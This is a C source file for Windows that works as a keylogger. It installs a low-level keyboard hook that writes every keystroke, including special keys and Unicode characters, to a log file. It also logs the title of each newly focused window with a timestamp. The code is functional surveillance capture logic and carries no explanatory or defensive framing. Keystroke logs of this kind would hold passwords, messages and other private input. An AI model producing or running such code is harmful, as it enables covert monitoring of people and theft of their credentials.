#include "logs.h"

HANDLE fd = NULL;

HHOOK hKeyboardHook = NULL;

int	write_to_file(char *str)
{
	if (fd == NULL)
	{
		printf("File handle is NULL\n");
		return -1;
	}
	DWORD bytesWritten;
	if (!WriteFile(fd, str, (DWORD)strlen(str), &bytesWritten, NULL))
	{
		printf("Failed to write to file: %lu\n", GetLastError());
		return -1;
	}
	return 0;
}

char	*GetDateFormated(void)
{
	LPSYSTEMTIME lpSystemTime = (LPSYSTEMTIME)malloc(sizeof(SYSTEMTIME));
	if (lpSystemTime == NULL)
		return NULL;

	GetLocalTime(lpSystemTime);
	if (lpSystemTime == NULL)
		return NULL;

	char *dateStr = (char *)malloc(22);
	if (dateStr == NULL)
	{
		free(lpSystemTime);
		return NULL;
	}

	sprintf_s(dateStr, 22, "%d.%d.%d %d:%d:%d",
		lpSystemTime->wDay, lpSystemTime->wMonth, lpSystemTime->wYear,
		lpSystemTime->wHour, lpSystemTime->wMinute, lpSystemTime->wSecond);
	free(lpSystemTime);
	return dateStr;
}

void CALLBACK WinForeground(HWINEVENTHOOK hWinEventHook, // Handle to the event hook
	DWORD event, // Event type
	HWND hwnd, // Handle to the window that generated the event
	LONG idObject,	 // Object identifier
	LONG idChild, // Child identifier
	DWORD dwEventThread, // Thread identifier of the thread that generated the event
	DWORD dwmsEventTime) // Time of the event in milliseconds since the system started
{
	(void)hWinEventHook;
	(void)idObject;
	(void)idChild;
	(void)dwEventThread;
	(void)dwmsEventTime;

	if (event == EVENT_SYSTEM_FOREGROUND)
	{
		char windowTitle[256];
		if (GetWindowTextA(hwnd, windowTitle, sizeof(windowTitle)) == 0)
			return;

		char *dateStr = GetDateFormated();
		if (dateStr == NULL)
			return;

		int i = 0;
		while (windowTitle[i] != '\0' && i < 256 - 1)
		{
			if (windowTitle[i] == '\r' || windowTitle[i] == '\n')
				windowTitle[i] = ' ';
			i++;
		}
		windowTitle[i] = '\0';
		char logEntry[512];
		sprintf_s(logEntry, sizeof(logEntry), "\n[%s] - Foreground window title: %s\n", dateStr, windowTitle);
		write_to_file(logEntry);
		free(dateStr);
	}

}


LRESULT CALLBACK LowLevelKeyboardProc(
	_In_ int    nCode,
	_In_ WPARAM wParam,
	_In_ LPARAM lParam
)
{
	if (nCode >= 0)
	{
		KBDLLHOOKSTRUCT* keyboardHookPtr = (KBDLLHOOKSTRUCT*)lParam;
		DWORD	keyCode = keyboardHookPtr->vkCode;
		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
		{
			char logEntry[64];
			if (keyCode == VK_ESCAPE)
			{
				sprintf_s(logEntry, sizeof(logEntry), "[ESC]");
				write_to_file(logEntry);
			}
			else if (keyCode == VK_RETURN)
			{
				sprintf_s(logEntry, sizeof(logEntry), "[ENTER]");
				write_to_file(logEntry);
			}
			else if (keyCode == VK_SPACE)
			{
				sprintf_s(logEntry, sizeof(logEntry), " ");
				write_to_file(logEntry);
			}
			else if (keyCode == VK_BACK)
			{
				sprintf_s(logEntry, sizeof(logEntry), "[BACKSPACE]");
				write_to_file(logEntry);
			}
			else if (keyCode == VK_CAPITAL)
			{
				sprintf_s(logEntry, sizeof(logEntry), "[CAPS]");
				write_to_file(logEntry);
			}
			else if (keyCode >= VK_F1 && keyCode <= VK_F24)
			{
				DWORD functionKeyNumber = keyCode - VK_F1 + 1;
				sprintf_s(logEntry, sizeof(logEntry), "[F%lu]", (unsigned long)functionKeyNumber);
				write_to_file(logEntry);
			}
			else
			{
				// Convert virtual key to Unicode character
				BYTE keyboardState[256];
				GetKeyboardState(keyboardState);
				
				WCHAR unicodeBuffer[5];
				int result = ToUnicode(keyCode, keyboardHookPtr->scanCode, keyboardState, unicodeBuffer, 4, 0);
				
				if (result > 0)
				{
					unicodeBuffer[result] = L'\0';
					char utf8Buffer[16];
					int bytesWritten = WideCharToMultiByte(CP_UTF8, 0, unicodeBuffer, -1, utf8Buffer, sizeof(utf8Buffer), NULL, NULL);
					if (bytesWritten > 0)
					{
						write_to_file(utf8Buffer);
					}
				}
			}
		}
	}
	return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}
